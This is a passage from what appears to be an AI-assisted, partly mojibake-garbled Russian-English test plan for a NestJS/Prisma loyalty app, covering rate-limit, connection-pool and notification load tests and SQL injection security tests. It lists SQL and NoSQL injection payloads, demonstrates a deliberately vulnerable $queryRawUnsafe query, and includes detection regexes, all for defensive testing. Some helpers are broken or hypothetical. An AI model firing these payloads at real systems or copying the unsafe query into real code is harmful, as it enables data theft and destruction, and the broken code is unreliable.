      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(429);

    console.log('Rate limit reached. Waiting 60 seconds...');

    // Wait for rate limit window to reset
    await new Promise(resolve => setTimeout(resolve, 61000)); // 61 seconds

    // Should be able to make requests again
    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    expect(response.headers['x-ratelimit-remaining']).toBe('99');

    console.log('Rate limit successfully reset after 1 minute');
  });

  // Test 5: Per-Tenant Rate Limiting (Isolation)
  it('should isolate rate limits per tenant', async () => {
    const tokenTenant1 = generateGuestToken('tenant-1');
    const tokenTenant2 = generateGuestToken('tenant-2');

    // Exhaust rate limit for tenant-1
    for (let i = 0; i < 100; i++) {
      await request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${tokenTenant1}`)
        .expect(200);
    }

    // Tenant-1 should be rate limited
    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${tokenTenant1}`)
      .expect(429);

    // Tenant-2 should still work
    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${tokenTenant2}`)
      .expect(200);

    expect(response.headers['x-ratelimit-remaining']).toBe('99');

    console.log('Rate limits properly isolated per tenant');
  });

  // Test 6: Burst Rate Limiting
  it('should handle burst traffic', async () => {
    const token = generateGuestToken('tenant-1');

    // Send 50 requests simultaneously
    const promises = Array(50).fill(null).map(() =>
      request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${token}`)
    );

    const results = await Promise.all(promises);

    const successCount = results.filter(r => r.status === 200).length;
    const rateLimitedCount = results.filter(r => r.status === 429).length;

    console.log('=== Burst Traffic (50 concurrent) ===');
    console.log(`Success: ${successCount}`);
    console.log(`Rate limited: ${rateLimitedCount}`);

    // All should succeed (under limit)
    expect(successCount).toBe(50);
    expect(rateLimitedCount).toBe(0);
  });

  // Test 7: Different Endpoints, Different Limits
  it('should apply different rate limits per endpoint', async () => {
    const token = generateGuestToken('tenant-1');

    // Public endpoint: 1000 req/min
    for (let i = 0; i < 200; i++) {
      await request(app.getHttpServer())
        .get('/api/v1/health')
        .expect(200);
    }

    // Authenticated endpoint: 100 req/min
    for (let i = 0; i < 100; i++) {
      await request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);
    }

    // Public endpoint still works
    await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    // Authenticated endpoint is rate limited
    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(429);

    console.log('Different rate limits applied per endpoint');
  });

  // Test 8: Rate Limit by IP Address (Unauthenticated)
  it('should rate limit by IP for unauthenticated requests', async () => {
    const ip = '192.168.1.100';

    // Simulate requests from same IP
    for (let i = 0; i < 100; i++) {
      await request(app.getHttpServer())
        .post('/api/v1/auth/login')
        .set('X-Forwarded-For', ip)
        .send({ phone: '+79991234567', password: 'test' })
        .expect(401); // Invalid credentials, but not rate limited
    }

    // 101st request should be rate limited
    const response = await request(app.getHttpServer())
      .post('/api/v1/auth/login')
      .set('X-Forwarded-For', ip)
      .send({ phone: '+79991234567', password: 'test' })
      .expect(429);

    expect(response.body.message).toContain('Too many requests');

    console.log('IP-based rate limiting works');
  });

  // Test 9: Sliding Window Rate Limit
  it('should use sliding window algorithm', async () => {
    jest.setTimeout(120000);

    const token = generateGuestToken('tenant-1');

    // Make 100 requests at t=0
    for (let i = 0; i < 100; i++) {
      await request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);
    }

    // Should be rate limited
    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(429);

    // Wait 30 seconds
    await new Promise(resolve => setTimeout(resolve, 30000));

    // Still rate limited (within 1-minute window)
    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(429);

    // Wait another 31 seconds (total 61 seconds)
    await new Promise(resolve => setTimeout(resolve, 31000));

    // Should work now (outside 1-minute window)
    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    console.log('Sliding window rate limiting works correctly');
  });

  // Test 10: Rate Limit Bypass for Admin
  it('should not rate limit admin users', async () => {
    const adminToken = generateAdminToken('tenant-1');

    // Make 200 requests (exceeds normal limit)
    for (let i = 0; i < 200; i++) {
      await request(app.getHttpServer())
        .get('/api/v1/admin/guests')
        .set('Authorization', `Bearer ${adminToken}`)
        .expect(200);
    }

    console.log('Admin users bypass rate limits');
  });
});

function generateGuestToken(tenantId: string): string {
  return jwt.sign(
    { userId: 'user-1', role: 'GUEST', tenantId },
    process.env.JWT_SECRET
  );
}

function generateAdminToken(tenantId: string): string {
  return jwt.sign(
    { userId: 'admin-1', role: 'ADMIN', tenantId },
    process.env.JWT_SECRET
  );
}
```


***

### **29. Database Connection Pool - exhaustion?**

**ะะพะฝัะตะบัั:** Prisma connection pool = 10 connections.

**ะะพะฟัะพั:** Load test?

- A) 5 concurrent queries โ all succeed
- B) 10 concurrent queries โ all succeed (pool full)
- C) 20 concurrent queries โ ะฟัะพะฒะตัะธัั queuing (ะฝะต ะฟะฐะดะฐะตั)
- D) C + ะฟัะพะฒะตัะธัั timeout ะตัะปะธ pool saturated > 30sec

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Connection pool exhaustion = ัะตะฐะปัะฝะฐั ะฟัะพะฑะปะตะผะฐ ะฒ production
- Query queuing ะดะพะปะถะตะฝ ัะฐะฑะพัะฐัั ะบะพััะตะบัะฝะพ
- Timeout ะฟัะตะดะพัะฒัะฐัะฐะตั hanging requests

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/performance/connection-pool.perf.spec.ts
describe('Database Connection Pool - Performance Testing', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: Under Pool Limit (5 concurrent queries)
  it('should handle 5 concurrent queries', async () => {
    const startTime = performance.now();

    const promises = Array(5).fill(null).map(() =>
      prisma.guestCard.findMany({ take: 10 })
    );

    await Promise.all(promises);

    const duration = performance.now() - startTime;

    console.log('=== 5 Concurrent Queries ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);

    expect(duration).toBeLessThan(1000);
  });

  // Test 2: At Pool Limit (10 concurrent queries)
  it('should handle 10 concurrent queries (pool full)', async () => {
    const startTime = performance.now();

    const promises = Array(10).fill(null).map(() =>
      prisma.guestCard.findMany({ take: 10 })
    );

    await Promise.all(promises);

    const duration = performance.now() - startTime;

    console.log('=== 10 Concurrent Queries (Pool Full) ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);

    expect(duration).toBeLessThan(2000);
  });

  // Test 3: Exceed Pool Limit (20 concurrent queries)
  it('should queue queries when pool exhausted', async () => {
    const startTime = performance.now();

    const promises = Array(20).fill(null).map(async (_, i) => {
      const queryStart = performance.now();
      
      await prisma.guestCard.findMany({ take: 10 });
      
      const queryDuration = performance.now() - queryStart;
      return { index: i, duration: queryDuration };
    });

    const results = await Promise.all(promises);
    const totalDuration = performance.now() - startTime;

    const avgDuration = results.reduce((sum, r) => sum + r.duration, 0) / results.length;
    const maxDuration = Math.max(...results.map(r => r.duration));

    console.log('=== 20 Concurrent Queries (Queuing) ===');
    console.log(`Total duration: ${totalDuration.toFixed(2)}ms`);
    console.log(`Avg query duration: ${avgDuration.toFixed(2)}ms`);
    console.log(`Max query duration: ${maxDuration.toFixed(2)}ms`);

    // Some queries should be queued (higher duration)
    expect(maxDuration).toBeGreaterThan(avgDuration * 1.5);
    expect(totalDuration).toBeLessThan(5000);
  });

  // Test 4: Long-Running Query Blocks Pool
  it('should handle long-running queries gracefully', async () => {
    const startTime = performance.now();

    // Start 1 long-running query
    const longQuery = prisma.$queryRaw`SELECT pg_sleep(5)`; // 5 seconds

    // Start 10 short queries after 1 second
    await new Promise(resolve => setTimeout(resolve, 1000));

    const shortQueries = Array(10).fill(null).map(() =>
      prisma.guestCard.findMany({ take: 10 })
    );

    // Both should complete
    await Promise.all([longQuery, ...shortQueries]);

    const duration = performance.now() - startTime;

    console.log('=== Long-Running Query Test ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);

    // Should complete in ~5 seconds (not blocked)
    expect(duration).toBeLessThan(7000);
  });

  // Test 5: Connection Timeout
  it('should timeout queries after 30 seconds', async () => {
    jest.setTimeout(35000);

    // Fill pool with stuck queries
    const stuckQueries = Array(10).fill(null).map(() =>
      prisma.$queryRaw`SELECT pg_sleep(60)` // 60 seconds (will timeout)
    );

    // Try to execute query while pool is stuck
    const timeoutStart = performance.now();

    try {
      await prisma.guestCard.findMany({ take: 10 });
    } catch (error) {
      const duration = performance.now() - timeoutStart;
      
      console.log('=== Connection Timeout ===');
      console.log(`Timeout after: ${duration.toFixed(2)}ms`);
      console.log(`Error: ${error.message}`);

      // Should timeout around 30 seconds
      expect(duration).toBeGreaterThan(28000);
      expect(duration).toBeLessThan(32000);
      expect(error.message).toContain('timeout');
    }

    // Cleanup stuck queries
    await Promise.allSettled(stuckQueries);
  });

  // Test 6: Monitor Active Connections
  it('should monitor connection pool metrics', async () => {
    // Get initial connection count
    const initialCount = await getActiveConnections();

    console.log(`Initial connections: ${initialCount}`);

    // Execute queries
    await Promise.all(
      Array(10).fill(null).map(() =>
        prisma.guestCard.findMany({ take: 10 })
      )
    );

    // Get peak connection count
    const peakCount = await getActiveConnections();

    console.log(`Peak connections: ${peakCount}`);

    // Wait for connections to be released
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Get final connection count
    const finalCount = await getActiveConnections();

    console.log(`Final connections: ${finalCount}`);

    // Pool should not leak connections
    expect(finalCount).toBeLessThanOrEqual(initialCount + 2);
  });

  // Test 7: Connection Pool with PgBouncer
  it('should work efficiently with PgBouncer', async () => {
    // PgBouncer provides connection pooling at PostgreSQL level
    // Prisma pool (10) -> PgBouncer pool (100) -> PostgreSQL

    const queries = Array(50).fill(null).map(() =>
      prisma.guestCard.findMany({ take: 10 })
    );

    const startTime = performance.now();
    await Promise.all(queries);
    const duration = performance.now() - startTime;

    console.log('=== With PgBouncer ===');
    console.log(`50 concurrent queries: ${duration.toFixed(2)}ms`);

    // Should handle 50 queries efficiently with PgBouncer
    expect(duration).toBeLessThan(5000);
  });

  // Test 8: Transaction Pool Pressure
  it('should handle concurrent transactions', async () => {
    const transactions = Array(20).fill(null).map(async (_, i) => {
      return prisma.$transaction(async (tx) => {
        await tx.guestCard.findMany({ take: 10 });
        await tx.ballTransaction.findMany({ take: 10 });
        return i;
      });
    });

    const startTime = performance.now();
    const results = await Promise.all(transactions);
    const duration = performance.now() - startTime;

    console.log('=== 20 Concurrent Transactions ===');
    console.log(`Duration: ${duration.toFixed(2)}ms`);
    console.log(`Completed: ${results.length}`);

    expect(results).toHaveLength(20);
    expect(duration).toBeLessThan(10000);
  });

  // Test 9: Pool Starvation Detection
  it('should detect pool starvation', async () => {
    const warnings: string[] = [];

    // Mock logger to capture warnings
    const logger = app.get('Logger');
    const originalWarn = logger.warn;
    logger.warn = jest.fn((message) => {
      warnings.push(message);
      originalWarn.call(logger, message);
    });

    // Create pool starvation (30 queries on 10 connection pool)
    const queries = Array(30).fill(null).map(() =>
      prisma.$queryRaw`SELECT pg_sleep(1)`
    );

    await Promise.all(queries);

    // Restore logger
    logger.warn = originalWarn;

    console.log('=== Pool Starvation Detection ===');
    console.log(`Warnings: ${warnings.length}`);

    // Should log warnings about pool pressure
    expect(warnings.some(w => w.includes('pool') || w.includes('connection'))).toBe(true);
  });
});

async function getActiveConnections(): Promise<number> {
  const result = await prisma.$queryRaw<[{ count: bigint }]>`
    SELECT COUNT(*) as count
    FROM pg_stat_activity
    WHERE datname = current_database()
      AND state = 'active';
  `;
  return Number(result[0].count);
}
```


***

### **30. Notification Sending - burst traffic?**

**ะะพะฝัะตะบัั:** Promo campaign โ 10,000 notifications ะพะดะฝะพะฒัะตะผะตะฝะฝะพ.

**ะะพะฟัะพั:** Load test?

- A) Send 100 notifications โ check delivery rate
- B) Send 10,000 notifications โ check queue saturation
- C) B + ะฟัะพะฒะตัะธัั rate limits external providers (Telegram, Email)
- D) C + ะฟัะพะฒะตัะธัั fallback ะตัะปะธ provider unavailable

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Burst campaigns = realistic scenario (Black Friday)
- External provider rate limits ะบัะธัะธัะฝั
- Fallback provider = production resilience

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/performance/notification-burst.perf.spec.ts
import { Queue, Worker } from 'bullmq';

describe('Notification Sending - Burst Traffic', () => {
  let app: INestApplication;
  let queue: Queue;
  let worker: Worker;
  let redis: Redis;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    redis = app.get('REDIS');
    queue = app.get('BullQueue_notifications');

    // Start worker
    worker = new Worker(
      'notifications',
      async (job) => {
        // Simulate notification sending
        await new Promise(resolve => setTimeout(resolve, 100));
        return { success: true };
      },
      {
        connection: redis,
        concurrency: 10,
      }
    );
  });

  afterAll(async () => {
    await worker.close();
    await app.close();
  });

  beforeEach(async () => {
    await queue.obliterate();
  });

  // Test 1: Small Burst (100 notifications)
  it('should handle 100 notifications burst', async () => {
    jest.setTimeout(30000);

    const startTime = Date.now();

    // Add 100 notifications
    const jobs = Array(100).fill(null).map((_, i) => ({
      name: 'send-notification',
      data: {
        guestId: `user-${i}`,
        type: 'BALLS_EARNED',
        channel: 'TELEGRAM',
        message: `Test notification ${i}`,
      },
    }));

    await queue.addBulk(jobs);

    // Wait for completion
    while (true) {
      const counts = await queue.getJobCounts('completed', 'failed');
      if (counts.completed + counts.failed >= 100) break;
      await new Promise(resolve => setTimeout(resolve, 500));
    }

    const duration = Date.now() - startTime;
    const throughput = (100 / duration) * 1000;

    console.log('=== 100 Notifications Burst ===');
    console.log(`Duration: ${duration}ms`);
    console.log(`Throughput: ${throughput.toFixed(2)} notifications/sec`);

    const counts = await queue.getJobCounts('completed', 'failed');
    expect(counts.completed).toBeGreaterThan(95);
  });

  // Test 2: Large Burst (10,000 notifications)
  it('should handle 10,000 notifications campaign', async () => {
    jest.setTimeout(300000); // 5 minutes

    console.log('Starting 10,000 notifications campaign...');

    const startTime = Date.now();

    // Add in batches
    for (let batch = 0; batch < 10; batch++) {
      const jobs = Array(1000).fill(null).map((_, i) => ({
        name: 'send-notification',
        data: {
          guestId: `user-${batch * 1000 + i}`,
          type: 'PROMO_AVAILABLE',
          channel: 'TELEGRAM',
          message: `Promo notification ${batch * 1000 + i}`,
        },
      }));

      await queue.addBulk(jobs);
      console.log(`Added batch ${batch + 1}/10`);
    }

    const enqueueTime = Date.now() - startTime;
    console.log(`Enqueued in ${enqueueTime}ms`);

    // Monitor progress
    const progressInterval = setInterval(async () => {
      const counts = await queue.getJobCounts('completed', 'failed', 'active', 'waiting');
      console.log(`Progress: ${counts.completed + counts.failed}/10000 (active: ${counts.active}, waiting: ${counts.waiting})`);
    }, 5000);

    // Wait for completion
    while (true) {
      const counts = await queue.getJobCounts('completed', 'failed');
      if (counts.completed + counts.failed >= 10000) break;
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    clearInterval(progressInterval);

    const totalDuration = Date.now() - startTime;
    const throughput = (10000 / totalDuration) * 1000;

    console.log('=== 10,000 Notifications Campaign ===');
    console.log(`Total duration: ${totalDuration}ms`);
    console.log(`Throughput: ${throughput.toFixed(2)} notifications/sec`);

    const counts = await queue.getJobCounts('completed', 'failed');
    console.log(`Completed: ${counts.completed}`);
    console.log(`Failed: ${counts.failed}`);

    expect(counts.completed).toBeGreaterThan(9500); // > 95% success
  });

  // Test 3: Telegram Rate Limit Handling
  it('should handle Telegram API rate limits', async () => {
    jest.setTimeout(60000);

    const telegramService = app.get('TelegramService');
    
    let requestCount = 0;
    let rateLimitCount = 0;

    // Mock Telegram API with rate limiting
    jest.spyOn(telegramService, 'sendMessage').mockImplementation(async () => {
      requestCount++;

      // Telegram limit: 30 messages/second
      if (requestCount % 30 === 0) {
        rateLimitCount++;
        throw {
          response: {
            status: 429,
            data: {
              retry_after: 1, // Wait 1 second
            },
          },
        };
      }

      return { ok: true };
    });

    // Send 100 notifications rapidly
    const jobs = Array(100).fill(null).map((_, i) => ({
      name: 'send-notification',
      data: {
        guestId: `user-${i}`,
        type: 'BALLS_EARNED',
        channel: 'TELEGRAM',
        message: `Test ${i}`,
      },
    }));

    await queue.addBulk(jobs);

    // Wait for completion
    while (true) {
      const counts = await queue.getJobCounts('completed', 'failed');
      if (counts.completed + counts.failed >= 100) break;
      await new Promise(resolve => setTimeout(resolve, 500));
    }

    console.log('=== Telegram Rate Limit Test ===');
    console.log(`Total requests: ${requestCount}`);
    console.log(`Rate limited: ${rateLimitCount}`);

    // Should handle rate limits gracefully
    const counts = await queue.getJobCounts('completed');
    expect(counts.completed).toBeGreaterThan(90);
  });

  // Test 4: Channel Fallback (Telegram โ SMS)
  it('should fallback to SMS when Telegram fails', async () => {
    jest.setTimeout(60000);

    const telegramService = app.get('TelegramService');
    const smsService = app.get('SmsService');

    let telegramAttempts = 0;
    let smsAttempts = 0;

    // Mock Telegram failures
    jest.spyOn(telegramService, 'sendMessage').mockRejectedValue(
      new Error('Telegram service unavailable')
    );

    // Mock SMS success
    jest.spyOn(smsService, 'send').mockResolvedValue({ success: true });

    // Send 50 notifications
    const jobs = Array(50).fill(null).map((_, i) => ({
      name: 'send-notification',
      data: {
        guestId: `user-${i}`,
        phone: '+79991234567',
        type: 'BALLS_EARNED',
        channels: ['TELEGRAM', 'SMS'], // Fallback chain
        message: `Test ${i}`,
      },
    }));

    await queue.addBulk(jobs);

    // Wait for completion
    while (true) {
      const counts = await queue.getJobCounts('completed', 'failed');
      if (counts.completed + counts.failed >= 50) break;
      await new Promise(resolve => setTimeout(resolve, 500));
    }

    telegramAttempts = telegramService.sendMessage.mock.calls.length;
    smsAttempts = smsService.send.mock.calls.length;

    console.log('=== Channel Fallback Test ===');
    console.log(`Telegram attempts: ${telegramAttempts}`);
    console.log(`SMS fallbacks: ${smsAttempts}`);

    // Should have attempted Telegram and fallen back to SMS
    expect(telegramAttempts).toBeGreaterThan(0);
    expect(smsAttempts).toBeGreaterThan(40); // Most should fallback
  });

  // Test 5: Priority Queue (Critical vs Normal)
  it('should prioritize critical notifications', async () => {
    jest.setTimeout(30000);

    const processOrder: string[] = [];

    const priorityWorker = new Worker(
      'notifications',
      async (job) => {
        processOrder.push(job.data.priority);
        await new Promise(resolve => setTimeout(resolve, 100));
        return { success: true };
      },
      { connection: redis, concurrency: 1 }
    );

    // Add mixed priority notifications
    await queue.addBulk([
      { name: 'send', data: { priority: 'NORMAL' }, opts: { priority: 5 } },
      { name: 'send', data: { priority: 'CRITICAL' }, opts: { priority: 1 } },
      { name: 'send', data: { priority: 'LOW' }, opts: { priority: 10 } },
      { name: 'send', data: { priority: 'HIGH' }, opts: { priority: 3 } },
      { name: 'send', data: { priority: 'NORMAL' }, opts: { priority: 5 } },
    ]);

    // Wait for processing
    await new Promise(resolve => setTimeout(resolve, 3000));

    console.log('=== Priority Queue Test ===');
    console.log(`Process order: ${processOrder.join(' โ ')}`);

    expect(processOrder[0]).toBe('CRITICAL');
    expect(processOrder[processOrder.length - 1]).toBe('LOW');

    await priorityWorker.close();
  });

  // Test 6: Delivery Latency Distribution
  it('should measure notification delivery latency', async () => {
    jest.setTimeout(60000);

    const latencies: number[] = [];
    const enqueueTimes = new Map<string, number>();

    // Add 1000 notifications
    for (let i = 0; i < 1000; i++) {
      const job = await queue.add('send-notification', {
        guestId: `user-${i}`,
        message: `Test ${i}`,
      });
      enqueueTimes.set(job.id, Date.now());
    }

    // Track completion times
    worker.on('completed', (job) => {
      const enqueueTime = enqueueTimes.get(job.id);
      if (enqueueTime) {
        latencies.push(Date.now() - enqueueTime);
      }
    });

    // Wait for completion
    while (latencies.length < 1000) {
      await new Promise(resolve => setTimeout(resolve, 1000));
    }

    // Calculate percentiles
    latencies.sort((a, b) => a - b);
    const p50 = latencies[Math.floor(latencies.length * 0.5)];
    const p95 = latencies[Math.floor(latencies.length * 0.95)];
    const p99 = latencies[Math.floor(latencies.length * 0.99)];
    const avg = latencies.reduce((a, b) => a + b, 0) / latencies.length;

    console.log('=== Delivery Latency Distribution ===');
    console.log(`Average: ${avg.toFixed(2)}ms`);
    console.log(`p50: ${p50}ms`);
    console.log(`p95: ${p95}ms`);
    console.log(`p99: ${p99}ms`);

    expect(p95).toBeLessThan(5000); // p95 < 5s
    expect(p99).toBeLessThan(10000); // p99 < 10s
  });
});
```


***

## **ะะะะ 6: SECURITY TESTING (10 ะฒะพะฟัะพัะพะฒ)**

ะะตัะตัะพะดะธะผ ะบ Security Testing (ะฒะพะฟัะพัั 31-40)? ๐

---

# ะัะพะดะพะปะถะฐะน

ะัะพะดะพะปะถะฐั! ๐

***

## **ะะะะ 6: SECURITY TESTING (10 ะฒะพะฟัะพัะพะฒ)**


***

### **31. SQL Injection - Prisma ะทะฐัะธัะฐะตั?**

**ะะพะฝัะตะบัั:** Query: `prisma.user.findMany({ where: { phone: userInput } })`

**ะะพะฟัะพั:** ะะฐะบ ัะตััะธัะพะฒะฐัั SQL injection?

- A) ะะฐะดะตััััั ััะพ Prisma ะทะฐัะธัะฐะตั
- B) Manual test: ะฟะตัะตะดะฐัั `' OR 1=1 --` ะฒ phone field
- C) Automated test: fuzzing ั SQL injection payloads
- D) C + ะฟัะพะฒะตัะธัั raw queries (`$queryRaw`) ั sanitization

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Prisma ะทะฐัะธัะฐะตั ะพั SQL injection ะฟะพ ัะผะพะปัะฐะฝะธั
- ะะ: `$queryRaw` ั user input = ััะทะฒะธะผะพััั
- Automated fuzzing ะฝะฐัะพะดะธั edge cases

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/security/sql-injection.security.spec.ts
describe('SQL Injection - Security Testing', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);

    // Seed test data
    await prisma.user.create({
      data: {
        id: 'user-1',
        phone: '+79991234567',
        role: 'GUEST',
        phoneVerified: true,
      },
    });
  });

  afterAll(async () => {
    await prisma.user.deleteMany();
    await app.close();
  });

  // Test 1: Basic SQL Injection (Prisma protects)
  it('should prevent basic SQL injection in Prisma queries', async () => {
    const maliciousInput = "' OR '1'='1"; // Classic SQL injection

    const users = await prisma.user.findMany({
      where: {
        phone: maliciousInput,
      },
    });

    // Prisma treats it as literal string, not SQL
    expect(users).toHaveLength(0); // No users found
  });

  // Test 2: SQL Injection Payloads (Comprehensive)
  it('should block common SQL injection payloads', async () => {
    const payloads = [
      "' OR 1=1 --",
      "' OR '1'='1",
      "admin'--",
      "' OR 'a'='a",
      "1' UNION SELECT NULL--",
      "' DROP TABLE users--",
      "'; DELETE FROM users WHERE '1'='1",
      "' AND 1=0 UNION ALL SELECT NULL, NULL--",
      "admin' /*",
      "' OR EXISTS(SELECT * FROM users)--",
    ];

    for (const payload of payloads) {
      const users = await prisma.user.findMany({
        where: { phone: payload },
      });

      expect(users).toHaveLength(0);
    }

    console.log(`โ Tested ${payloads.length} SQL injection payloads - all blocked`);
  });

  // Test 3: Raw Query Vulnerability (DANGEROUS)
  it('should demonstrate raw query vulnerability', async () => {
    const userInput = "' OR '1'='1"; // Malicious input

    // โ VULNERABLE CODE (for demonstration)
    try {
      const unsafeQuery = `
        SELECT * FROM "User"
        WHERE phone = '${userInput}'
      `;

      const users = await prisma.$queryRawUnsafe(unsafeQuery);

      // This WILL execute: SELECT * FROM "User" WHERE phone = '' OR '1'='1'
      // Returns ALL users (SQL injection successful!)
      expect(users.length).toBeGreaterThan(0); // Demonstrates vulnerability
      
      console.log('โ๏ธ SQL Injection successful in raw query!');
    } catch (error) {
      // Expected to fail in safe environment
    }
  });

  // Test 4: Safe Raw Query (Parameterized)
  it('should use parameterized queries for raw SQL', async () => {
    const userInput = "' OR '1'='1";

    // โ SAFE: Parameterized query
    const users = await prisma.$queryRaw`
      SELECT * FROM "User"
      WHERE phone = ${userInput}
    `;

    // Prisma treats $userInput as parameter, not SQL
    expect(users).toHaveLength(0);
    console.log('โ Parameterized query blocked SQL injection');
  });

  // Test 5: Second-Order SQL Injection
  it('should prevent second-order SQL injection', async () => {
    // Step 1: Store malicious data
    const maliciousName = "'; DROP TABLE users--";

    await prisma.user.create({
      data: {
        id: 'user-malicious',
        phone: '+79997777777',
        role: 'GUEST',
        phoneVerified: true,
        guestProfile: {
          create: {
            firstName: maliciousName, // Store malicious payload
          },
        },
      },
    });

    // Step 2: Retrieve and use in query (should be safe)
    const user = await prisma.user.findUnique({
      where: { id: 'user-malicious' },
      include: { guestProfile: true },
    });

    // Step 3: Use retrieved data in another query
    const searchResults = await prisma.user.findMany({
      where: {
        guestProfile: {
          firstName: user.guestProfile.firstName, // Malicious data used here
        },
      },
    });

    // Prisma parameterizes, so this is safe
    expect(searchResults).toHaveLength(1);
    
    // Verify table still exists
    const allUsers = await prisma.user.findMany();
    expect(allUsers.length).toBeGreaterThan(0);

    console.log('โ Second-order SQL injection blocked');
  });

  // Test 6: NoSQL Injection (MongoDB-style)
  it('should prevent NoSQL injection attempts', async () => {
    // NoSQL injection payloads (if using raw JSON queries)
    const noSqlPayloads = [
      { $gt: '' }, // Greater than empty string (returns all)
      { $ne: null }, // Not equal to null (returns all)
      { $regex: '.*' }, // Regex match all
    ];

    for (const payload of noSqlPayloads) {
      // Prisma doesn't interpret these as operators
      const users = await prisma.user.findMany({
        where: {
          phone: payload as any,
        },
      });

      expect(users).toHaveLength(0);
    }

    console.log('โ NoSQL injection payloads blocked');
  });

  // Test 7: LIKE Injection
  it('should sanitize LIKE queries', async () => {
    const maliciousInput = "%' OR '1'='1"; // Try to inject via LIKE

    const users = await prisma.user.findMany({
      where: {
        phone: {
          startsWith: maliciousInput,
        },
      },
    });

    expect(users).toHaveLength(0);
    console.log('โ LIKE injection blocked');
  });

  // Test 8: Unicode SQL Injection
  it('should block unicode SQL injection', async () => {
    const unicodePayloads = [
      "' OR 1=1โ", // Em dash instead of hyphen
      "' OR '1'='1' โ",
      "\u0027 OR 1=1--", // Unicode apostrophe
    ];

    for (const payload of unicodePayloads) {
      const users = await prisma.user.findMany({
        where: { phone: payload },
      });

      expect(users).toHaveLength(0);
    }

    console.log('โ Unicode SQL injection blocked');
  });

  // Test 9: Automated Fuzzing
  it('should fuzz SQL injection vectors', async () => {
    const sqlmap = require('sqlmap'); // Hypothetical fuzzing library

    const results = await fuzzSqlInjection({
      endpoint: '/api/v1/auth/login',
      parameter: 'phone',
      payloadCount: 1000,
    });

    console.log('=== SQL Injection Fuzzing ===');
    console.log(`Payloads tested: ${results.total}`);
    console.log(`Vulnerabilities found: ${results.vulnerabilities.length}`);

    expect(results.vulnerabilities).toHaveLength(0);
  });

  // Test 10: Code Review - Raw Query Detection
  it('should detect unsafe raw queries in codebase', async () => {
    const fs = require('fs');
    const path = require('path');

    const unsafePatterns = [
      /\$queryRawUnsafe/g,
      /\$executeRawUnsafe/g,
      /`SELECT.*\$\{.*\}`/g, // Template literal injection
    ];

    const codebasePath = path.join(__dirname, '../../../src');
    const violations: string[] = [];

    function scanDirectory(dir: string) {
      const files = fs.readdirSync(dir);

      for (const file of files) {
        const filePath = path.join(dir, file);
        const stat = fs.statSync(filePath);

        if (stat.isDirectory()) {
          scanDirectory(filePath);
        } else if (file.endsWith('.ts')) {
          const content = fs.readFileSync(filePath, 'utf8');

          for (const pattern of unsafePatterns) {
            const matches = content.match(pattern);
            if (matches) {
              violations.push(`${filePath}: ${matches.join(', ')}`);
            }
          }
        }
      }
    }

    scanDirectory(codebasePath);

    console.log('=== Unsafe Raw Query Detection ===');
    if (violations.length > 0) {
      console.log('โ๏ธ Found unsafe patterns:');
      violations.forEach(v => console.log(`  - ${v}`));
    } else {
      console.log('โ No unsafe raw queries detected');
    }

    // In strict mode, fail if any unsafe patterns found
    // expect(violations).toHaveLength(0);
  });
});

// Helper function
async function fuzzSqlInjection(options: any): Promise<any> {
  // Simulated fuzzing
  const payloads = generateSqlInjectionPayloads(options.payloadCount);
  const vulnerabilities: any[] = [];

  for (const payload of payloads) {
    const response = await request(app.getHttpServer())
      .post(options.endpoint)
      .send({ [options.parameter]: payload });

    // Check for SQL error messages
    if (
      response.status === 500 &&
      (response.text.includes('SQL syntax') ||
       response.text.includes('database error'))
    ) {
      vulnerabilities.push({
        payload,
        response: response.text,
      });
    }
  }

  return {
    total: payloads.length,
    vulnerabilities,
  };
}

function generateSqlInjectionPayloads(count: number): string[] {
  const templates = [
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "'; DROP TABLE users--",
    "' AND 1=0 UNION ALL SELECT NULL--",
  ];

  const payloads: string[] = [];

  for (let i = 0; i < count; i++) {
    const template = templates[i % templates.length];
    payloads.push(template);
  }

  return payloads;
}
```


***

### **32. JWT Token Security - token hijacking?**

